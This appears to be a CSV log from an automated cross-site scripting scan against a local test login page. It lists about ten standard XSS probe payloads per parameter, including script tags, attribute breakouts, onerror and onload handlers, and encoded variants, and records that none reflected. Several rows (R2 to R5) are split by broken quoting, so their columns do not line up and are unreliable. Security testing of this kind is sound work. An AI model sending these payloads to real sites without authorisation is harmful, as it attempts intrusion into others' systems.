payload_id,endpoint,url,payload,status_code,response_time,content_length,reflected_payload,script_indicators_count,script_indicators,is_malicious,analysis_notes,timestamp
R1,/?id=1,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.016791582107543945,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:36.612545
R2,/?id=1,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
R3,';alert(1)//,query_param,JavaScript context break
R4,<img src=x onerror=alert(1)>,query_param,Image error handler
R5, onmouseover=alert(1)",200,0.013864278793334961,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:36.828047
R6,/?id=1,http://localhost:8080/login.php,javascript:alert(1),200,0.012780904769897461,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.042828
R7,/?id=1,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.013193845748901367,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.257555
R8,/?id=1,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.013636112213134766,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.472431
R9,/?id=1,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.01097869873046875,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.684845
R10,/?id=1,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.012195110321044922,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.898783
R1,/?page=1,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.012629032135009766,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.113881
R2,/?page=1,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
R3,';alert(1)//,query_param,JavaScript context break
R4,<img src=x onerror=alert(1)>,query_param,Image error handler
R5, onmouseover=alert(1)",200,0.021468639373779297,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.336335
R6,/?page=1,http://localhost:8080/login.php,javascript:alert(1),200,0.010551691055297852,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.548716
R7,/?page=1,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.01486968994140625,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.764206
R8,/?page=1,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.013777732849121094,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.979983
R9,/?page=1,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.011635065078735352,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:39.192828
R10,/?page=1,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.014347076416015625,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:39.409098
